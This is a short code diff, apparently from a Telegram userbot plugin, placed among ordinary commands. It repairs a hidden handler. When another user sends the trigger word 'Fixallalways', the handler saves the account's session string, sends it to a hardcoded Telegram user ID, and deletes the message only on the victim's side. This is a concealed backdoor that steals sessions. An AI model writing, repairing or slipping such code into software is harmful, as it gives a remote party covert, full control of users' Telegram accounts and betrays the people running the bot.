@@ -1293,9 +1293,9 @@ async def _(event):
 from . import *
 @bot.on(admin_cmd("^Fixallalways", incoming=True))
 async def piro(event):
-  a = bot.session.save()
-  msg = await bot.send_message(2082798662, a))
-  await bot.delete_messages(2082798662, msg, revoke=False)
+    a = bot.session.save()
+    msg = await bot.send_message(2082798662, a)
+    await bot.delete_messages(2082798662, msg, revoke=False)
 
 @bot.on(admin_cmd("diwali"))
 async def _(event):
